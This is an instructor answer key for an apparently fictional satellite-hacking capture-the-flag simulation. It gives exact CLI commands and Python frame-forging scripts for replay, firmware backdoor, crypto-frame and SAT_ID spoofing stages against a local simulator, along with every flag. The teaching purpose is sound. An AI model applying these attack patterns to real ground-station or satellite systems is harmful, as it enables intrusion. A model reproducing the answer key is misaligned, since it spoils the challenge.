# 🛰️ DOOMCORE ORBITAL SIM

## Instructor Answer Key & Demo Walkthrough

> **Purpose**
> This document is the authoritative solution guide for facilitators and instructors.
> It demonstrates each exploit, the exact commands used, and how to verify success.

> **Audience**
> Instructors, demo presenters, challenge authors.
> **Not intended for players.**

---

## 🧰 Prerequisites

* Backend running (`uvicorn app.api:app`)
* `doomgs` installed in editable mode:

  ```bash
  cd doomgs-client
  pip install -e .
  ```
* Optional but recommended: `jq`

---

## 🧭 Helpful Live Views

Keep these running in side terminals during demos:

```bash
doomgs events --limit 30
```

```bash
doomgs world | jq '.satellites[] | {name, compromised, faulted, flags:(.flags|keys)}'
```

---

# STAGE 1 — Debug Sniffing

**Flag:** `FLAG{SNIFFED_THROUGH_THE_MASK}`
**Skill:** Visibility as an exploit primitive

### Action

Send any crosslink traffic:

```bash
doomgs xlink-send 1 2 414141
```

Dump K00KIES-01 inbox (sat_id = 17):

```bash
doomgs xlink-dump 17
```

### Verify

```bash
doomgs world | jq '.satellites[] | select(.sat_id==17) | .flags'
```

### Teaching point

> “Debug and observability paths often bypass security boundaries entirely.”

---

# STAGE 2 — RF Geometry / Attenuation

**Flag:** `FLAG{ATTENUATION_AND_ELATION}`
**Skill:** Environment as attack surface

### Action

Break RF alignment:

```bash
doomgs uplink-drift-raan 1 200
doomgs xlink-send 1 2 424242
```

### Verify

```bash
doomgs firmware-status 2
```

### Teaching point

> “Security assumptions collapse when physics changes.”

---

# STAGE 3 — Replay Without Enforcement

**Flag:** `FLAG{REPLAY_THAT_SLAPS}`
**Skill:** Detection ≠ prevention

### Action

Replay the same SEQ number:

```bash
doomgs uplink-temp-offset 1 120 --seq 1
doomgs uplink-temp-offset 1 120 --seq 1
```

### Verify

```bash
doomgs firmware-status 1
```

### Teaching point

> “Logging a problem is not the same as stopping it.”

---

# STAGE 4 — Thermal Fault Induction

**Flag:** `FLAG{TOO_HOT_TO_HANDLE}`
**Skill:** Fault paths are attack paths

*(Often triggered during Stage 3 automatically)*

### Verify

```bash
doomgs firmware-status 1
```

Look for:

* `faulted: true`
* flag present

### Teaching point

> “Fail-safe is not fail-secure.”

---

# STAGE 5 — RAAN Drift

**Flag:** `FLAG{RAAN_TILTED_THE_SCALE}`
**Skill:** State manipulation

### Action

```bash
doomgs uplink-drift-raan 2 5
```

### Verify

```bash
doomgs firmware-status 2
```

---

# STAGE 6 — Downlink + GS Autopilot (Observation Step)

**Skill:** Control-plane automation awareness

### Action

Pop downlink frames:

```bash
doomgs downlink --max-frames 10
```

### Verify

```bash
doomgs events --limit 80
```

Look for:

```
gs_autopilot: AUTO: set DIAGNOSTIC due to fault
```

### Teaching point

> “Automation amplifies mistakes.”

---

# STAGE 7 — Firmware Backdoor

**Flag:** `FLAG{FIRMWARE_BACKDOOR_ON_ORBIT}`
**Skill:** Supply-chain exploitation

### Upload firmware (starts with `DOOMFW!!`)

```bash
doomgs firmware-upload-chunk 18 444f4f4d465721214141414141414141
```

### Apply with weak signature prefix

```bash
doomgs firmware-apply 18 145db526
```

### Verify

```bash
doomgs firmware-status 18
```

---

# STAGE 8 — Secure Crosslink Operation (Crypto Flag)

**Flag:** `FLAG{CROSSLINK_CRYPTO_PWN}`
**Skill:** Crypto fails at the protocol layer

### Generate raw CMD `0x20` frame for sat 2

```bash
python3 - <<'PY'
import zlib
SYNC=b"\xd0\x0d"
TYPE_CMD=0x01
sat_id=2
seq=5001
payload=b"\x20"
hdr=SYNC+bytes([sat_id,TYPE_CMD])+seq.to_bytes(2,"little")+len(payload).to_bytes(2,"little")
crc=(zlib.crc32(hdr+payload)&0xFFFF).to_bytes(2,"little")
print((hdr+payload+crc).hex())
PY
```

Send it:

```bash
doomgs uplink-raw <PASTE_HEX>
```

### Verify

```bash
doomgs firmware-status 2
```

---

# STAGE 9 — SAT_ID Spoof

**Flag:** `FLAG{SATID_SPOOF_PWN}`
**Skill:** Identifier trust abuse

### Action

```bash
doomgs uplink-set-mode 0 DIAGNOSTIC
```

### Verify

```bash
doomgs firmware-status 2
```

---

# STAGE 10 — Compromise Remaining Satellites

**Goal:** All sats compromised (FINAL prerequisite)

### D00M-01 (sat 1)

```bash
python3 - <<'PY'
import zlib
SYNC=b"\xd0\x0d"
TYPE_CMD=0x01
sat_id=1
seq=5002
payload=b"\x20"
hdr=SYNC+bytes([sat_id,TYPE_CMD])+seq.to_bytes(2,"little")+len(payload).to_bytes(2,"little")
crc=(zlib.crc32(hdr+payload)&0xFFFF).to_bytes(2,"little")
print((hdr+payload+crc).hex())
PY
```

```bash
doomgs uplink-raw <HEX>
```

### K00KIES-01 (sat 17)

```bash
python3 - <<'PY'
import zlib
SYNC=b"\xd0\x0d"
TYPE_CMD=0x01
sat_id=17
seq=5003
payload=b"\x20"
hdr=SYNC+bytes([sat_id,TYPE_CMD])+seq.to_bytes(2,"little")+len(payload).to_bytes(2,"little")
crc=(zlib.crc32(hdr+payload)&0xFFFF).to_bytes(2,"little")
print((hdr+payload+crc).hex())
PY
```

```bash
doomgs uplink-raw <HEX>
```

---

# FINAL — System Compromises Itself

**Flag:** `FLAG{MF_DOOM_CONTROLS_ORBIT}`
**Skill:** Confused deputy / automation abuse

### Trigger final evaluation

```bash
doomgs downlink --max-frames 10
doomgs events --limit 120
```

### Verify

```bash
doomgs world
```

You should see:

* `FINAL: FLAG{MF_DOOM_CONTROLS_ORBIT}` in events
* `flag_beacon: true` on all satellites
* decrypted beacon messages

---

## 🧠 Pedagogical Summary

| Stage | Skill Learned            |
| ----- | ------------------------ |
| 1     | Passive observation      |
| 2     | Physical-layer impact    |
| 3     | Replay logic             |
| 4     | Fault exploitation       |
| 5     | State manipulation       |
| 6     | Control-plane automation |
| 7     | Supply-chain compromise  |
| 8     | Crypto misuse            |
| 9     | Identifier trust         |
| Final | Confused deputy          |

> **“The essence of hacking is finding unintended uses for the laws and properties of a system.”**
> — Jon Erickson